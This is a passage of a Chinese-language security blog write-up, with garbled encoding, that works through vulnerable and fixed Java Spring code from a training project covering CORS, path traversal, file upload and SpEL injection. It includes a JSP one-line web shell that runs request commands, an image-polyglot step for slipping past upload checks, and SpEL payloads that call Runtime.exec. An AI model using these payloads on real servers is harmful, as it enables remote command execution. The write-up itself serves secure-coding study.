<h3 id="æ¼æ´é˜²å¾¡"><a href="#æ¼æ´é˜²å¾¡" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h3><h4 id="ï¼ˆ1ï¼‰é™åˆ¶origin"><a href="#ï¼ˆ1ï¼‰é™åˆ¶origin" class="headerlink" title="ï¼ˆ1ï¼‰é™åˆ¶origin"></a>ï¼ˆ1ï¼‰é™åˆ¶origin</h4><p>é˜²å¾¡ä»£ç ï¼š</p>
<pre><code class="Java">  @CrossOrigin(origins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;)
    @GetMapping(&quot;/sec/crossOrigin&quot;)
    public String secCrossOrigin() &#123;
        return info;
    &#125;
</code></pre>
<h4 id="ï¼ˆ2ï¼‰WebMvcConfigurerè®¾ç½®Cors"><a href="#ï¼ˆ2ï¼‰WebMvcConfigurerè®¾ç½®Cors" class="headerlink" title="ï¼ˆ2ï¼‰WebMvcConfigurerè®¾ç½®Cors"></a>ï¼ˆ2ï¼‰WebMvcConfigurerè®¾ç½®Cors</h4><p>é˜²å¾¡ä»£ç ï¼š</p>
<pre><code class="Java">  @GetMapping(&quot;/sec/webMvcConfigurer&quot;)
    public CsrfToken getCsrfToken_01(CsrfToken token) &#123;
        return token;
    &#125;
</code></pre>
<p>å¯¹åº”è¿‡æ»¤å™¨ï¼š</p>
<pre><code class="Java">    public WebMvcConfigurer corsConfigurer() &#123;
        return new WebMvcConfigurerAdapter() &#123;
            @Override
            public void addCorsMappings(CorsRegistry registry) &#123;
                // ä¸ºäº†æ”¯æŒä¸€çº§åŸŸåï¼Œé‡å†™äº†checkOrigin
                //String[] allowOrigins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;;
                registry.addMapping(&quot;/cors/sec/webMvcConfigurer&quot;) // /**è¡¨ç¤ºæ‰€æœ‰è·¯ç”±path
                        //.allowedOrigins(allowOrigins)
                        .allowedMethods(&quot;GET&quot;, &quot;POST&quot;)
                        .allowCredentials(true);
            &#125;
        &#125;;
    &#125;
</code></pre>
<h4 id="ï¼ˆ3ï¼‰spring-securityè®¾ç½®cors"><a href="#ï¼ˆ3ï¼‰spring-securityè®¾ç½®cors" class="headerlink" title="ï¼ˆ3ï¼‰spring securityè®¾ç½®cors"></a>ï¼ˆ3ï¼‰spring securityè®¾ç½®cors</h4><p>é˜²å¾¡ä»£ç ï¼š</p>
<pre><code class="Java">@GetMapping(&quot;/sec/httpCors&quot;)
public CsrfToken getCsrfToken_02(CsrfToken token) &#123;
    return token;
&#125;
</code></pre>
<p>å¯¹åº”è¿‡æ»¤å™¨ï¼š</p>
<pre><code class="java">    CorsConfigurationSource corsConfigurationSource()
    &#123;
        // Set cors origin white list
        ArrayList&lt;String&gt; allowOrigins = new ArrayList&lt;&gt;();
        allowOrigins.add(&quot;joychou.org&quot;);
        allowOrigins.add(&quot;https://test.joychou.me&quot;); // åŒºåˆ†httpå’Œhttpsï¼Œå¹¶ä¸”é»˜è®¤ä¸ä¼šæ‹¦æˆªåŒåŸŸè¯·æ±‚ã€‚

        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(allowOrigins);
        configuration.setAllowCredentials(true);
        configuration.setAllowedMethods(Arrays.asList(&quot;GET&quot;, &quot;POST&quot;));
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration(&quot;/cors/sec/httpCors&quot;, configuration); // ant style
        return source;
    &#125;
</code></pre>
<h4 id="ï¼ˆ4ï¼‰è‡ªå®šä¹‰filterè®¾ç½®cors"><a href="#ï¼ˆ4ï¼‰è‡ªå®šä¹‰filterè®¾ç½®cors" class="headerlink" title="ï¼ˆ4ï¼‰è‡ªå®šä¹‰filterè®¾ç½®cors"></a>ï¼ˆ4ï¼‰è‡ªå®šä¹‰filterè®¾ç½®cors</h4><p>é˜²å¾¡ä»£ç ï¼š</p>
<pre><code class="Java">    @GetMapping(&quot;/sec/originFilter&quot;)
    public CsrfToken getCsrfToken_03(CsrfToken token) &#123;
        return token;
    &#125;
</code></pre>
<p>å¯¹åº”è¿‡æ»¤å™¨ï¼š</p>
<pre><code class="Java">@WebFilter(filterName = &quot;OriginFilter&quot;, urlPatterns = &quot;/cors/sec/originFilter&quot;)
public class OriginFilter implements Filter &#123;

    @Override
    public void init(FilterConfig filterConfig) throws ServletException &#123;

    &#125;

    private final Logger logger = LoggerFactory.getLogger(this.getClass());

    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain filterChain)
            throws IOException, ServletException &#123;

        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;

        String origin = request.getHeader(&quot;Origin&quot;);
        logger.info(&quot;[+] Origin: &quot; + origin + &quot;\tCurrent url:&quot; + request.getRequestURL());

        // ä»¥fileåè®®è®¿é—®htmlï¼Œoriginä¸ºå­—ç¬¦ä¸²çš„nullï¼Œæ‰€ä»¥ä¾ç„¶ä¼šèµ°å®‰å…¨checké€»è¾‘
        if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) &#123;
            logger.error(&quot;[-] Origin check error. &quot; + &quot;Origin: &quot; + origin +
                    &quot;\tCurrent url:&quot; + request.getRequestURL());
            response.setStatus(response.SC_FORBIDDEN);
            response.getWriter().println(&quot;Invaid cors config by joychou.&quot;);
            return;
        &#125;

        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);
        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);
        response.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;GET, POST, OPTION&quot;);

        filterChain.doFilter(req, res);
    &#125;
</code></pre>
<h4 id="ï¼ˆ5ï¼‰CorsFilterè®¾ç½®cors"><a href="#ï¼ˆ5ï¼‰CorsFilterè®¾ç½®cors" class="headerlink" title="ï¼ˆ5ï¼‰CorsFilterè®¾ç½®cors"></a>ï¼ˆ5ï¼‰CorsFilterè®¾ç½®cors</h4><p>é˜²å¾¡ä»£ç ï¼š</p>
<pre><code class="Java"> @RequestMapping(&quot;/sec/corsFilter&quot;)
    public CsrfToken getCsrfToken_04(CsrfToken token) &#123;
        return token;
    &#125;
</code></pre>
<p>å¯¹åº”è¿‡æ»¤å™¨ï¼š</p>
<pre><code class="Java">public class BaseCorsFilter extends CorsFilter &#123;

    public BaseCorsFilter() &#123;
        super(configurationSource());
    &#125;

    private static UrlBasedCorsConfigurationSource configurationSource() &#123;
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowCredentials(true);
        config.addAllowedOrigin(&quot;joychou.org&quot;); // ä¸æ”¯æŒ
        config.addAllowedOrigin(&quot;http://test.joychou.me&quot;);
        config.addAllowedHeader(&quot;*&quot;);
        config.addAllowedMethod(&quot;GET&quot;);
        config.addAllowedMethod(&quot;POST&quot;);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration(&quot;/cors/sec/corsFilter&quot;, config);

        return source;
    &#125;
&#125;
</code></pre>
<h4 id="ï¼ˆ6ï¼‰originæ£€æŸ¥"><a href="#ï¼ˆ6ï¼‰originæ£€æŸ¥" class="headerlink" title="ï¼ˆ6ï¼‰originæ£€æŸ¥"></a>ï¼ˆ6ï¼‰originæ£€æŸ¥</h4><p>é˜²å¾¡ä»£ç ï¼š</p>
<pre><code class="Java">    @GetMapping(&quot;/sec/checkOrigin&quot;)
    public String seccode(HttpServletRequest request, HttpServletResponse response) &#123;
        String origin = request.getHeader(&quot;Origin&quot;);

        // å¦‚æœoriginä¸ä¸ºç©ºå¹¶ä¸”originä¸åœ¨ç™½åå•å†…ï¼Œè®¤å®šä¸ºä¸å®‰å…¨ã€‚
        // å¦‚æœoriginä¸ºç©ºï¼Œè¡¨ç¤ºæ˜¯åŒåŸŸè¿‡æ¥çš„è¯·æ±‚æˆ–è€…æµè§ˆå™¨ç›´æ¥å‘èµ·çš„è¯·æ±‚ã€‚
        if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) &#123;
            return &quot;Origin is not safe.&quot;;
        &#125;
        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);
        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);
        return LoginUtils.getUserInfo2JsonStr(request);
    &#125;
</code></pre>
<h2 id="åä¸€ã€ç›®å½•éå†"><a href="#åä¸€ã€ç›®å½•éå†" class="headerlink" title="åä¸€ã€ç›®å½•éå†"></a>åä¸€ã€ç›®å½•éå†</h2><h3 id="1-è·¯ç”±-x2F-path-traversal-x2F-vul"><a href="#1-è·¯ç”±-x2F-path-traversal-x2F-vul" class="headerlink" title="1.è·¯ç”±&#x2F;path_traversal&#x2F;vul"></a>1.è·¯ç”±&#x2F;path_traversal&#x2F;vul</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">  @GetMapping(&quot;/path_traversal/vul&quot;)
    public String getImage(String filepath) throws IOException &#123;
        return getImgBase64(filepath);
    &#125;
private String getImgBase64(String imgFile) throws IOException &#123;

        logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;));
        logger.info(&quot;File path: &quot; + imgFile);

        File f = new File(imgFile);
        if (f.exists() &amp;&amp; !f.isDirectory()) &#123;
            byte[] data = Files.readAllBytes(Paths.get(imgFile));
            return new String(Base64.encodeBase64(data));
        &#125; else &#123;
            return &quot;File doesn&#39;t exist or is not a file.&quot;;
        &#125;
    &#125;
</code></pre>
<p>å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶è¯»å–æ¥å£ï¼Œæ„é€ ç›®å½•éå†æ‹¿åˆ°base64æ•°æ®</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008163207205.png" alt="image-20241008163207205"></p>
<p>è§£ç æ‹¿åˆ°å†…å®¹ï¼š</p>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008163241485.png" alt="image-20241008163241485"></p>
<p>ä¿®å¤ä»£ç ï¼š</p>
<pre><code class="Java">    @GetMapping(&quot;/path_traversal/sec&quot;)
    public String getImageSec(String filepath) throws IOException &#123;
        if (SecurityUtil.pathFilter(filepath) == null) &#123;
            logger.info(&quot;Illegal file path: &quot; + filepath);
            return &quot;Bad boy. Illegal file path.&quot;;
        &#125;
        return getImgBase64(filepath);
    &#125;
</code></pre>
<p>pathFilterå‡½æ•°å†…å®¹ï¼š</p>
<pre><code class="Java"> public static String pathFilter(String filepath) &#123;
        String temp = filepath;

        // use while to sovle multi urlencode
        while (temp.indexOf(&#39;%&#39;) != -1) &#123;
            try &#123;
                temp = URLDecoder.decode(temp, &quot;utf-8&quot;);
            &#125; catch (UnsupportedEncodingException e) &#123;
                logger.info(&quot;Unsupported encoding exception: &quot; + filepath);
                return null;
            &#125; catch (Exception e) &#123;
                logger.info(e.toString());
                return null;
            &#125;
        &#125;

        if (temp.contains(&quot;..&quot;) || temp.charAt(0) == &#39;/&#39;) &#123;
            return null;
        &#125;

        return filepath;
    &#125;
</code></pre>
<p>å¯¹æ–‡ä»¶è·¯å¾„å‚æ•°å¢åŠ äº†è¿‡æ»¤æ–¹æ³•pathFilterï¼Œå¦‚æœæ–‡ä»¶è·¯å¾„å¼€å¤´ä¸º&#x2F;å­—ç¬¦æˆ–è€…å­˜åœ¨..è¿ç»­å­—ç¬¦å‡ºç°å°±è¿”å›ç©ºå­—ç¬¦ä¸²ï¼Œä½†æ˜¯è¿™ç§è¿‡æ»¤åªæ˜¯ç®€å•çš„åº”å¯¹æªæ–½ï¼Œå¦‚æœæ˜¯Windowsæ“ä½œç³»ç»Ÿä¸Šä»¥ç›˜ç¬¦å¼€å§‹çš„è·¯å¾„ï¼Œå°±æ˜¾å¾—æ— èƒ½ä¸ºåŠ›ã€‚</p>
<h2 id="åäºŒã€æ–‡ä»¶ä¸Šä¼ "><a href="#åäºŒã€æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="åäºŒã€æ–‡ä»¶ä¸Šä¼ "></a>åäºŒã€æ–‡ä»¶ä¸Šä¼ </h2><h3 id="1-è·¯ç”±-x2F-file-x2F-upload"><a href="#1-è·¯ç”±-x2F-file-x2F-upload" class="headerlink" title="1.è·¯ç”±&#x2F;file&#x2F;upload"></a>1.è·¯ç”±&#x2F;file&#x2F;upload</h3><pre><code class="java">    @PostMapping(&quot;/upload&quot;)
    public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,
                                   RedirectAttributes redirectAttributes) &#123;
        if (file.isEmpty()) &#123;
            // èµ‹å€¼ç»™uploadStatus.htmlé‡Œçš„åŠ¨æ€å‚æ•°message
            redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);
            return &quot;redirect:/file/status&quot;;
        &#125;

        try &#123;
            // Get the file and save it somewhere
            byte[] bytes = file.getBytes();
            Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());
            Files.write(path, bytes);

            redirectAttributes.addFlashAttribute(&quot;message&quot;,
                    &quot;You successfully uploaded &#39;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#39;&quot;);

        &#125; catch (IOException e) &#123;
            redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);
            logger.error(e.toString());
        &#125;

        return &quot;redirect:/file/status&quot;;
    &#125;
</code></pre>
<p>æ–‡ä»¶ä¸Šä¼ åˆ°æ–¹æ³•ä¸­ï¼Œæœªåˆ¤æ–­æ–‡ä»¶çš„ç±»å‹ã€æ‰©å±•åç­‰ä¿¡æ¯ï¼Œä¹Ÿæœªå¯¹ç”Ÿæˆæ–‡ä»¶çš„æ–‡ä»¶åè¿›è¡Œé‡ç½®ï¼Œåªæ˜¯ç›´æ¥å°†æ–‡ä»¶ä¸Šä¼ åˆ°æ–‡ä»¶ä¿å­˜ç›®å½•ä¸­ï¼Œä½¿ç”¨æµ‹è¯•æ–‡ä»¶æˆåŠŸä¸Šä¼ ã€‚æ„é€ ä¸€å¥è¯æœ¨é©¬ï¼š</p>
<pre><code class="jsp">&lt;% if (&quot;pass&quot;.equals(request.getParameter(&quot;pwd&quot;))) &#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b)) != -1) out.println(new String(b)); &#125; %&gt;
</code></pre>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241008181225763.png" alt="image-20241008181225763"></p>
<p>ä¿®å¤ä»£ç ï¼š</p>
<pre><code class="Java">    @PostMapping(&quot;/upload/picture&quot;)
    @ResponseBody
    public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception &#123;
        if (multifile.isEmpty()) &#123;
            return &quot;Please select a file to upload&quot;;
        &#125;

        String fileName = multifile.getOriginalFilename();
        String Suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); // è·å–æ–‡ä»¶åç¼€å
        String mimeType = multifile.getContentType(); // è·å–MIMEç±»å‹
        String filePath = UPLOADED_FOLDER + fileName;
        File excelFile = convert(multifile);


        // åˆ¤æ–­æ–‡ä»¶åç¼€åæ˜¯å¦åœ¨ç™½åå•å†…  æ ¡éªŒ1
        String[] picSuffixList = &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;
        boolean suffixFlag = false;
        for (String white_suffix : picSuffixList) &#123;
            if (Suffix.toLowerCase().equals(white_suffix)) &#123;
                suffixFlag = true;
                break;
            &#125;
        &#125;
        if (!suffixFlag) &#123;
            logger.error(&quot;[-] Suffix error: &quot; + Suffix);
            deleteFile(filePath);
            return &quot;Upload failed. Illeagl picture.&quot;;
        &#125;


        // åˆ¤æ–­MIMEç±»å‹æ˜¯å¦åœ¨é»‘åå•å†… æ ¡éªŒ2
        String[] mimeTypeBlackList = &#123;
                &quot;text/html&quot;,
                &quot;text/javascript&quot;,
                &quot;application/javascript&quot;,
                &quot;application/ecmascript&quot;,
                &quot;text/xml&quot;,
                &quot;application/xml&quot;
        &#125;;
        for (String blackMimeType : mimeTypeBlackList) &#123;
            // ç”¨containsæ˜¯ä¸ºäº†é˜²æ­¢text/html;charset=UTF-8ç»•è¿‡
            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;
                logger.error(&quot;[-] Mime type error: &quot; + mimeType);
                deleteFile(filePath);
                return &quot;Upload failed. Illeagl picture.&quot;;
            &#125;
        &#125;

        // åˆ¤æ–­æ–‡ä»¶å†…å®¹æ˜¯å¦æ˜¯å›¾ç‰‡ æ ¡éªŒ3
        boolean isImageFlag = isImage(excelFile);
        deleteFile(randomFilePath);

        if (!isImageFlag) &#123;
            logger.error(&quot;[-] File is not Image&quot;);
            deleteFile(filePath);
            return &quot;Upload failed. Illeagl picture.&quot;;
        &#125;


        try &#123;
            // Get the file and save it somewhere
            byte[] bytes = multifile.getBytes();
            Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());
            Files.write(path, bytes);
        &#125; catch (IOException e) &#123;
            logger.error(e.toString());
            deleteFile(filePath);
            return &quot;Upload failed&quot;;
        &#125;

        logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);
        logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);
        return String.format(&quot;You successfully uploaded &#39;%s&#39;&quot;, filePath);
    &#125;
</code></pre>
<p>åˆ¤æ–­ä¸ºå›¾ç‰‡æ‰å…è®¸ä¸Šä¼ ï¼Œä¸è¿‡ä»å¯é€šè¿‡å…¶ä»–æ–¹å¼ç»•è¿‡</p>
<pre><code class="bash">copy 1.png/shell.jsp muma.png
</code></pre>
<h2 id="åä¸‰ã€SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"><a href="#åä¸‰ã€SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´" class="headerlink" title="åä¸‰ã€SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"></a>åä¸‰ã€SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</h2><p>Spring Expression Languageï¼ˆç®€ç§°SpELï¼‰æ˜¯ä¸€ç§å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œæ”¯æŒåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ã€‚è¯­è¨€è¯­æ³•ç±»ä¼¼äºUnified ELï¼Œä½†æä¾›äº†é¢å¤–çš„åŠŸèƒ½ï¼Œç‰¹åˆ«æ˜¯æ–¹æ³•è°ƒç”¨å’ŒåŸºæœ¬çš„å­—ç¬¦ä¸²æ¨¡æ¿åŠŸèƒ½ï¼Œå› ä¸ºSpELçš„åŠŸèƒ½å¼ºå¤§å…è®¸åœ¨è¡¨è¾¾å¼ä¸­åŠ¨æ€è°ƒç”¨æ–¹æ³•ã€‚</p>
<h3 id="1-è·¯ç”±-x2F-spel-x2F-vuln1"><a href="#1-è·¯ç”±-x2F-spel-x2F-vuln1" class="headerlink" title="1.è·¯ç”±&#x2F;spel&#x2F;vuln1"></a>1.è·¯ç”±&#x2F;spel&#x2F;vuln1</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">   @RequestMapping(&quot;/spel/vuln1&quot;)
    public String spel_vuln1(String value) &#123;
        ExpressionParser parser = new SpelExpressionParser();
        return parser.parseExpression(value).getValue().toString();
    &#125;
</code></pre>
<p>å¯ä»¥é€šè¿‡spelè¡¨è¾¾å¼å®ç°å‘½ä»¤æ‰§è¡Œ</p>
<pre><code>T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)
</code></pre>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009100727504.png" alt="image-20241009100727504"></p>
<h3 id="2-è·¯ç”±-x2F-spel-x2F-vuln2"><a href="#2-è·¯ç”±-x2F-spel-x2F-vuln2" class="headerlink" title="2.è·¯ç”±&#x2F;spel&#x2F;vuln2"></a>2.è·¯ç”±&#x2F;spel&#x2F;vuln2</h3><p>æ¼æ´ä»£ç ï¼š</p>
<pre><code class="Java">  @RequestMapping(&quot;spel/vuln2&quot;)
    public String spel_vuln2(String value) &#123;
        StandardEvaluationContext context = new StandardEvaluationContext();
        SpelExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(value, new TemplateParserContext());
        Object x = expression.getValue(context);    // trigger vulnerability point
        return x.toString();   // response
    &#125;
</code></pre>
<p>æ¯”ä¸Šé¢ä»£ç å¤šå¥—äº†ä¸€å±‚æ¨¡æ¿å¼•æ“ï¼Œæ‰€ä»¥è¿™é‡Œè¦å¤šåŠ ä¸ª<code>#&#123;&#125;</code>å»è§£æ</p>
<pre><code> #&#123;T(java.lang.Runtime).getRuntime().exec(&#39;calc&#39;)&#125;
</code></pre>
<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20241009102136299.png" alt="image-20241009102136299"></p>
<h3 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><p>ä¿®å¤ä»£ç ï¼š</p>
<pre><code class="Java">  @RequestMapping(&quot;spel/sec&quot;)
    public String spel_sec(String value) &#123;
        SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
        SpelExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(value, new TemplateParserContext());
        Object x = expression.getValue(context);
        return x.toString();
    &#125;
</code></pre>
<p>ä½¿ç”¨ SimpleEvaluationContextè¿›è¡ŒåŠ å›ºï¼Œå®šä¹‰ä¸€ä¸ªåªè¯»çš„ä¸Šä¸‹æ–‡ç¯å¢ƒé˜²æ­¢ä¸å®‰å…¨çš„æ“ä½œ</p>
<h2 id="åå››ã€Deserializeååºåˆ—åŒ–"><a href="#åå››ã€Deserializeååºåˆ—åŒ–" class="headerlink" title="åå››ã€Deserializeååºåˆ—åŒ–"></a>åå››ã€Deserializeååºåˆ—åŒ–</h2>
      
       <hr><span style="font-style: italic;color: gray;"> è½¬è½½è¯·æ³¨æ˜æ¥æºï¼Œæ¬¢è¿å¯¹æ–‡ç« ä¸­çš„å¼•ç”¨æ¥æºè¿›è¡Œè€ƒè¯ï¼Œæ¬¢è¿æŒ‡å‡ºä»»ä½•æœ‰é”™è¯¯æˆ–ä¸å¤Ÿæ¸…æ™°çš„è¡¨è¾¾ã€‚å¯ä»¥åœ¨ä¸‹é¢è¯„è®ºåŒºè¯„è®ºï¼Œä¹Ÿå¯ä»¥é‚®ä»¶è‡³1004454362@qq.com </span>
    </div>
</article>





    <div id="comments">
    <!-- æ¥å¿…åŠ›Cityç‰ˆå®‰è£…ä»£ç  -->
    <div id="lv-container" data-id="city" data-uid="MTAyMC81ODIyMS8zNDY4NA==">
        <script type="text/javascript">
			(function(d, s) {
				var j, e = d.getElementsByTagName(s)[0];

				if (typeof LivereTower === 'function') { return; }

				j = d.createElement(s);
				window.livereOptions = {
					eagerLoading: true,
					scrollEventTargetSelector: '#post'
                }
				j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
				j.async = true;
				e.parentNode.insertBefore(j, e);
			})(document, 'script');
        </script>
        <noscript> ä¸ºæ­£å¸¸ä½¿ç”¨æ¥å¿…åŠ›è¯„è®ºåŠŸèƒ½è¯·æ¿€æ´»JavaScript</noscript>
    </div>
    <!-- Cityç‰ˆå®‰è£…ä»£ç å·²å®Œæˆ -->
</div>




    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    Â©2024 ttycp3
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="åˆ‡æ¢å…¨å± å¿«æ·é”® s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>


<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*æ¸²æŸ“å¯¹åº”çš„è¡¨æ ¼æ ·å¼*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*æ¸²æŸ“æ‰“èµæ ·å¼*/
        
    
        /*é«˜äº®ä»£ç å—è¡Œå·*/
        
        $('pre code').each(function(){
            var lines = $(this).text().trim().split('\n').length, widther='';
            if (lines>99) {
                widther = 'widther'
            }
            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
            $(this).addClass('has-numbering ' + widther)
                    .parent()
                    .append($numbering);
            for(var i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        
    
        /*è®¿é—®æ•°é‡*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        
    
        /*ä»£ç é«˜äº®ï¼Œè¡Œå·å¯¹é½*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
    
        
        
    }
    
    /*æ‰“èµé¡µé¢éšè—ä¸å±•ç¤º*/
    

</script>

<!--åŠ å…¥è¡Œå·çš„é«˜äº®ä»£ç å—æ ·å¼-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 1px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    code.has-numbering.widther{
        margin-left: 35px;
    }
    .pre-numbering{
        margin: 0;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: ;
    }
    .pre-numbering.widther {
        width: 35px;
    }
</style>

<!--è‡ªå®šä¹‰æ ·å¼è®¾ç½®-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    
    .nav-right nav a.hover > span{
        color: #ffffff !important;
    }
    

    /*åˆ—è¡¨æ ·å¼*/
    
    #post .pjax article .article-entry>ol, #post .pjax article .article-entry>ul, #post .pjax article>ol, #post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    #post .pjax article .article-entry li>ol, #post .pjax article .article-entry li>ul,#post .pjax article li>ol, #post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    #post .pjax article .article-entry>ol>li, #post .pjax article .article-entry>ul>li,#post .pjax article>ol>li, #post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    #post .pjax article .article-entry li>ol>li, #post .pjax article .article-entry li>ul>li,#post .pjax article li>ol>li, #post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    
    
    /* èƒŒæ™¯å›¾æ ·å¼ */
    
    #post {
        background: url(https://ttycp3.oss-cn-beijing.aliyuncs.com/img/110.jpg);
    }
    
    


    /*å¼•ç”¨å—æ ·å¼*/
    
    
    /*æ–‡ç« åˆ—è¡¨èƒŒæ™¯å›¾*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("https://ttycp3.oss-cn-beijing.aliyuncs.com/img/4caf928d4512df81ec482d1e953bf4db9dbb7533.jpg@942w_1307h_progressive.webp");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    
    
    
</style>










</html>
